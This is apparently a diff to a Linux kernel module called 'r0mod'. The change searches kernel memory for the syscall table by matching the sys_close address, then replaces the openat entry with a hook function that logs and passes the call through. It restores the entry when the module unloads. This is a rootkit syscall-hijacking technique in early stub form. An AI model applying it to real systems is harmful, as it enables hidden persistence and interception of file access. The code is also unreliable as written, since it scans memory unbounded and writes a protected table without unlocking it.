@@ -1,48 +1,78 @@
 #include <linux/init.h>
-#include <linux/module.h>
 #include <linux/kernel.h>
-#include <linux/errno.h>
-#include <linux/types.h>
-#include <linux/unistd.h>
-#include <asm/current.h>
-#include <linux/sched.h>
+#include <linux/module.h>
+#include <linux/err.h>
+#include <linux/scatterlist.h>
+#include <linux/mutex.h>
 #include <linux/syscalls.h>
+#include <linux/moduleparam.h>
+#include <linux/unistd.h>
+#include <linux/slab.h>
+#include <asm/uaccess.h>
 
 #include <r0mod/global.h>
 
-#define START_MEM   0xc0000000
-#define END_MEM     0xd0000000
+void **sys_call_table;
 
-unsigned long *syscall_table;
-
-unsigned long **find(void)
+asmlinkage long _hook_sys_openat(unsigned int dfd,
+    const char __user *filename, int flags, umode_t mode)
 {
-    static unsigned long **sctable;
-    static unsigned long int i = START_MEM;
+    printk("into openat syscall hook");
+    return real_sys_openat(dfd,filename,flags,mode);
+}
 
-    while(i < END_MEM)
+// find sys_call_table through sys_close address
+static unsigned long **find_sys_call_table(void)
+{
+    unsigned long offset;
+    unsigned long **sct;
+
+    int flag = 0;
+
+    //sys call num maybe different
+    //check in unistd.h
+    //__NR_close will use 64bit version unistd.h by default when build LKM
+    for(offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *))
     {
-        sctable = (unsigned long **)i;
-
-        if(sctable[__NR_close] == (unsigned long *)sys_close)
-            return &sctable[0];
-
-        i += sizeof(void *);
+        sct = (unsigned long **)offset;
+        if(sct[__NR_close] == (unsigned long *)sys_close)
+        {
+            if(flag == 0)
+            {
+                printk("Found sys_call_table @ %llx", (long long unsigned int)sct);
+                return sct;
+            }
+            else
+            {
+                printk("Found first sys_call_table @ %llx", (long long unsigned int)sct);
+                flag--;
+            }
+        }
     }
 
+    /*
+     * Given the loop limit, it's somewhat unlikely we'll get here. I don't
+     * even know if we can attempt to fetch such high addresses from memory,
+     * and even if you can, it will take a while!
+     */
     return NULL;
 }
 
+
+
 static int __init r0mod_init(void)
 {
-    printk("Module starting...\n");
+    printk("Module starting...");
 
-    syscall_table = (unsigned long *)find();
+    sys_call_table = (void*)find_sys_call_table();
+    printk("Found sys_call_table @ %llx", (long long unsigned int)sys_call_table);
 
-    if(syscall_table != NULL)
-        printk("Syscall table found at %x\n", (unsigned int)*syscall_table);
-    else
-        printk("Syscall table not found!\n");
+    real_sys_openat = (void*)(sys_call_table[__NR_openat]);
+    printk("real_openat addr @ %llx", (long long unsigned int)real_sys_openat);
+    printk("_NR_openat:%d", __NR_openat);
+    printk("hook_openat addr @ %llx", (long long unsigned int)_hook_sys_openat);
+
+    sys_call_table[__NR_openat] = &_hook_sys_openat;
 
     return 0;
 }
@@ -50,7 +80,9 @@ static int __init r0mod_init(void)
 
 static void __exit r0mod_exit(void)
 {
-    printk("Module ending...\n");
+    printk("Module ending...");
+
+    sys_call_table[__NR_openat] = real_sys_openat;
 
     return;
 }
